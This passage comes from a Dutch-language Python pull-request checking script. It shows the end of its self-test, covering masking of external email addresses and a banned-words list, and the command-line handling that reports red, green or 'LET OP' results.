    r, l, _ = alg({"pages/a.md": "TLDR\nmail jan.jansen@klant.nl\n"}, inst=pg)
    eis("pg: een persoonsadres buiten de eigen domeinen is LET OP, niet rood", r == [] and len(l) == 1)
    eis("pg: de LET OP noemt het adres niet voluit", "jansen" not in l[0] and "j\u2026@klant.nl" in l[0])
    r, l, _ = alg({"src/index.njk": "<p>Onze synergie</p>\n"}, inst={"verboden_woorden": ["synergie"]})
    eis("woordenlijst: treffer in src/ geeft LET OP", r == [] and len(l) == 1)
    r, l, _ = alg({"src/index.njk": "<p>Onze synergie</p>\n"}, inst={})
    eis("woordenlijst: zonder lijst stil", r == [] and l == [])
    if fouten:
        print("self-test STUK: %d" % len(fouten)); return 1
    print("self-test OK"); return 0


if __name__ == "__main__":
    if "--self-test" in sys.argv:
        sys.exit(zelftest())
    if "--algemeen" in sys.argv:
        args = [a for a in sys.argv[1:] if not a.startswith("--")]
        basis = sys.argv[sys.argv.index("--basis") + 1] if "--basis" in sys.argv else "origin/main"
        args = [a for a in args if a != basis]
        if len(args) != 1:
            print("gebruik: pr-toets.py --algemeen <pr-checkout> [--basis origin/main]"); sys.exit(2)
        try:
            rood, let_op, n = toets_algemeen(args[0], basis)
        except Exception as e:
            print("::error::kon niet meten: %s" % e); sys.exit(2)
        for r in let_op:
            print("LET OP " + r)
        if rood:
            for r in rood:
                print("ROOD  " + r)
            sys.exit(1)
        print("GROEN %d bestand(en)" % n); sys.exit(0)
    args = [a for a in sys.argv[1:] if not a.startswith("--")]
    basis = "origin/main"
    if "--basis" in sys.argv:
        basis = sys.argv[sys.argv.index("--basis") + 1]
        args = [a for a in args if a != basis]
    if len(args) != 1:
        print("gebruik: pr-toets.py <tak-checkout> [--basis origin/main] | --self-test"); sys.exit(2)
    try:
        rood, n = toets(args[0], basis)
    except Exception as e:  # kon niet meten is niet groen
        print("::error::kon niet meten: %s" % e); sys.exit(2)
    if rood:
        for r in rood:
            print("ROOD  " + r)
        print(melding_regel(rood))
        sys.exit(1)
    print("GROEN %d bestand(en) binnen de afspraak" % n)
